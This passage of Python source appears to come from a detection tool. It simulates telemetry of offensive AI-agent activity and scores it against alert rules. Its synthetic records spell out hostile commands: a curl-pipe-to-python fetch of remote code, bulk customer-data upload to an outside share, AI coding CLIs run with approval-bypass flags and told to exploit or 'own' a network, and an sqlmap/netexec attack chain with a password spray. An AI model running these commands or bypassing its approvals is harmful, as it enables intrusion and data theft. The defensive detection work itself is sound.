                    {"kind": "process", "host": "DEV-WS-102", "user": "dev.backend", "pid": pid + 1, "ppid": pid,
                     "image": "nmap", "cmdline": "nmap -sV -T4 10.0.7.0/24"}]
        if x < 0.025:  # Agent Zero / Hermes: dynamic code from the agent runtime
            pid = next(self.pids)
            return [{"kind": "process", "host": "SRV-AI-01", "user": "svc.ai.support", "pid": pid, "ppid": 1,
                     "image": "python3", "cmdline": "python3 run_ui.py --agent agent-zero"},
                    {"kind": "process", "host": "SRV-AI-01", "user": "svc.ai.support", "pid": pid + 1, "ppid": pid,
                     "image": "bash", "cmdline": "bash -c 'curl -s https://files.example/x.py | python3'"}]
        if x < 0.029:
            return [{"kind": "db", "host": "SRV-SQL-01", "user": "svc.report", "client_host": "SRV-FILE-02",
                     "statement": "SELECT * FROM customers", "rows": 120_000, "bytes": 64_000_000},
                    {"kind": "dlp", "host": "SRV-FILE-02", "user": "svc.report", "dest": "drive.share-transfer.example",
                     "channel": "web-upload", "bytes": 64_000_000, "classification": "Confidential", "action": "allowed"}]
        return []

    def _yolo(self, now):
        if self.yolo is None:
            if now < self.next_yolo or self.rng.random() > 0.04:
                return []
            cli = self.rng.choice([
                ("claude", "claude --dangerously-skip-permissions -p 'enumerate and exploit 10.0.5.0/24'"),
                ("gemini", "gemini --yolo -p 'full pentest of intranet web apps'"),
                ("hermes", "hermes --yolo chat -q 'own the staging network'"),
                ("codex", "codex exec --dangerously-bypass-approvals-and-sandbox 'find RCE on 10.0.5.12'"),
            ])
            pid = next(self.pids)
            self.yolo = {"pid": pid, "left": ["nmap", "httpx", "nuclei", "ffuf", "sqlmap", "netexec"]}
            return [{"kind": "process", "host": "DEV-WS-118", "user": "dev.frontend", "pid": pid, "ppid": 1,
                     "image": cli[0], "cmdline": cli[1]}]
        y = self.yolo
        tool = y["left"].pop(0)
        args = {"nmap": "-sV -T4 10.0.5.0/24", "httpx": "-l hosts.txt -silent", "nuclei": "-l live.txt -severity high,critical",
                "ffuf": "-u http://10.0.5.12/FUZZ -w common.txt", "sqlmap": "-u 'http://10.0.5.12/item?id=1' --batch --dbs",
                "netexec": "smb 10.0.5.0/24 -u users.txt -p Spring2026!"}[tool]
        rec = {"kind": "process", "host": "DEV-WS-118", "user": "dev.frontend", "pid": next(self.pids),
               "ppid": y["pid"], "image": tool, "cmdline": f"{tool} {args}"}
        if not y["left"]:
            self.yolo, self.next_yolo = None, now + 150
        return [rec]


class OffensiveAIMonitor:
    def __init__(self, rng, approved: set[tuple[str, str]] | None = None):
        if approved is None:
            approved = {(h, "*") for h in settings.ai_approved_hosts} or {("SRV-AI-01", "*"), ("SRV-AI-02", "*")}
        # Separate state for simulated and real telemetry: dedup/sliding windows must never let
        # simulated activity suppress (or trigger) alerts on real logs.
        self.detector = Detector(approved)
        self.real_detector = Detector(approved)
        self.sim = OffensiveAISim(rng)
        self.last_records: list[dict] = []
        self.rule_hits: Counter = Counter()
        self.fw_hits: Counter = Counter()
        self._index_version = None

    def refresh_index(self) -> None:
        rows = threatintel.agentic_index()
        if rows and self._index_version is not rows:
            self.detector.index = self.real_detector.index = IndicatorIndex(rows)
            self._index_version = rows

    def ingest(self, recs: list[dict], now: float, real: bool = False) -> list[dict]:
        self.refresh_index()
        det = self.real_detector if real else self.detector
        self.last_records = recs
        alerts = []
        for rec in recs:
            for rule, extra in det.evaluate(rec, now):
                title, sev, tech, tactic = RULES[rule]
                sev = extra.pop("severity", None) or sev
                self.rule_hits[rule] += 1
                if extra.get("framework"):
                    for fw in extra["framework"].split():
                        self.fw_hits[fw] += 1
                kind = rec["kind"]
                domain = {"process": "endpoint", "logon": "identity", "db": "data", "dlp": "data"}.get(kind, "network")
                host = rec.get("dst_host") if kind == "http" else rec.get("dest_host") if kind == "logon" else rec.get("host")
                user = rec.get("user") or (f"src:{rec['src_ip']}" if rec.get("src_ip") else "unknown")
                detail = extra.get("framework") and " / ".join(FRAMEWORKS.get(f, (f,))[0] for f in extra["framework"].split())
                label = f"[{rule}] {title}" + (f" — {detail}" if detail else "") + (
                    f" — {extra['provider']} ({extra['region']})" if extra.get("provider") else "")
                alerts.append({"spec": (domain, label, sev, tech, tactic), "host": host, "user": user,
                               "extra": {"detector": "offensive-ai", "rule": rule,
                                         "record": (rec.get("cmdline") or rec.get("uri") or rec.get("dest") or "")[:160],
                                         "cti_match": "agentic-attack-detections" if rule == "OAI-006" else None,
                                         **extra}})
        return alerts

    def step(self, now: float, scale: int = 1) -> list[dict]:
        recs = []
        for _ in range(scale):
            recs.extend(self.sim.step(now))
        return self.ingest(recs, now)

    def summary(self) -> dict:
        idx = threatintel.agentic_index() or []
        per_fw: dict[str, Counter] = defaultdict(Counter)
        for r in idx:
            fws = (r.get("framework") or "").split()
            if "antifox" in ((r.get("value") or "") + " " + (r.get("context") or "")).lower():
                fws.append("antifox")
            for fw in set(fws):
                per_fw[fw][r["type"]] += 1
        return {
            "rules": [{"id": k, "title": t, "severity": s, "technique": te, "tactic": ta, "hits": self.rule_hits[k]}
                      for k, (t, s, te, ta) in RULES.items()],
            "frameworks": [{"id": k, "name": n, "desc": d, "focus": focus, "hits": self.fw_hits[k],
                            "rules": [{"id": r, "hits": self.rule_hits[r] if r.startswith("OAI") else None}
                                      for r in rules],
                            "indicators": sum(per_fw[k].values()), "by_type": dict(per_fw[k].most_common(4))}
                           for k, (n, d, focus, rules) in FRAMEWORKS.items()],
            "feed_loaded": bool(idx),
        }
